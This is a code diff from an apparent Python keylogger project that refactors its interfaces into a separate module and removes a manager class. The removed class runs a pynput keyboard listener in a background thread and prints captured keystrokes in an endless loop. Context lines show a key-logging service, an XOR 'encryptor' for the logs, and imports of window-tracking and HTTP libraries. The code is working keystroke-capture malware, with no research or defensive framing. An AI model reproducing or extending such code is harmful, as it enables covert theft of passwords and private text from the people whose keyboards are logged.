@@ -1,31 +1,5 @@
-from abc import ABC, abstractmethod
-from pynput.keyboard import Listener
-import time,json,random,string, threading,pywinctl,requests
-from KeyLoggerAgent import ToolBox
-
-
-class IKeyLogger(ABC):
-    @abstractmethod
-    def on_press(self,key) -> None:
-        pass
-    @abstractmethod
-    def get_logged_keys(self) -> dict[str:str]:
-        pass
-class IKeyLoggerManager(ABC):
-    @abstractmethod
-    def start_logging(self) -> None:
-        pass
-    @abstractmethod
-    def stop_logging(self) -> None:
-        pass
-    @abstractmethod
-    def get_logged_keys(self) -> dict[str:str]:
-        pass
-
-class Write(ABC):
-    @abstractmethod
-    def write(self, data:str) -> bool:
-        pass
+from Interface import IKeyLogger,Write
+import time,ToolBox,pywinctl, json,requests,random,string
 
 
 class KeyLoggerService(IKeyLogger):
@@ -95,40 +69,3 @@ class Encryptor:
         for i in range(len(data)):
             ciphertext += chr(ord(data[i]) ^ ord(self.key[i % length_key]))
         return ciphertext
-
-class KeyLoggerManager:
-    def __init__(self):
-        self.__key_logger = KeyLoggerService()
-        self.__writer = FileWriter()
-        self.__encryptor = Encryptor()
-        self.__is_logging = False
-        self.__logger_thread = threading.Thread(target=self.__listen)
-
-
-    def start_logging(self):
-        self.__is_logging = True
-        self.__logger_thread.start()
-
-    def stop_logging(self):
-        self.__is_logging = False
-
-    def __listen(self):
-        with Listener(on_press=self.__key_logger.on_press) as listener:
-            listener.join()
-
-    def print_keys(self):
-        logged_keys = self.__key_logger.get_logged_keys()
-        self.__key_logger.clear_logged_keys()
-        for key, value in logged_keys.items():
-            print(key)
-            print(value)
-
-x = KeyLoggerManager()
-x.start_logging()
-while True:
-    # time.sleep(1)
-    x.print_keys()
-
-
-
-
